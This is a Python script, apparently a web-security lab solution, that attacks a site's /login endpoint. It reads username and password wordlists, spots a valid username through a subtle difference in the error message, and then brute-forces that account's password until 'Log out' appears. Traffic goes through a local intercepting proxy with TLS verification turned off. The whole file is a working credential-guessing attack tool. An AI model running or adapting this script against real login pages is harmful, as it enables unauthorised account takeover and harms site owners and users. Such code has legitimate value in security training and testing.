import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def read_file(file_path):
    lines = []
    try:
        with open(file_path, "r") as file:
            for line in file:
                lines.append(line.strip())
        return lines
    except IOError:
        print("Could not read the file.", file_path)
        return -1
    

def enemerate_credentials(url, usernames_path, passwords_path):
    login_url = url + "/login"
    usernames_list = read_file(usernames_path)
    passwords_list = read_file(passwords_path)
    valid_username = ""
    valid_password = ""

    print("(+) Enumerating Username... ")
    if len(usernames_list) > 1:
        for username in usernames_list:
            login_data = {"username": username, "password": "admin"}
            res = requests.post(login_url, data=login_data, proxies=proxies, verify=False)

            if "Invalid username or password </p>" in res.text:
                print("(+) Found a valid username...")
                print("(+) The valid username is:", username)
                valid_username = username
                break
        if not valid_username:
            print("(-) Unable to find a valid username...")
    else:
        print("(-) Invalid file name/path...")
        sys.exit(-1)


    print("(+) Enumerating Password... ")
    if len(passwords_list) > 1:
        for password in passwords_list:
            login_data = {"username": valid_username, "password": password}
            res = requests.post(login_url, data=login_data, proxies=proxies, verify=False)

            if "Log out" in res.text:
                print("(+) Found a valid password...")
                print("(+) The valid password is:", password)
                valid_password = password
                print("(+) Successfully exploited the vulnerabilities.")
                break
        if not valid_password:
            print("(-) Unable to find a valid password...")
    else:
        print("(-) Invalid file name/path...")
        sys.exit(-1)

def main():
    if len(sys.argv) != 4:
        print(f"(+) Usage: {sys.argv[0]} <url> <payload_file_1> <payload_file_2>")
        print(f"(+) Example: {sys.argv[0]} https://example.com usernames.txt passwords.txt")
        sys.exit(-1)
    
    url = sys.argv[1]
    usernames_txt_path = sys.argv[2]
    password_txt_path = sys.argv[3]
    enemerate_credentials(url, usernames_txt_path, password_txt_path)
    

   



if __name__ == "__main__":
    main()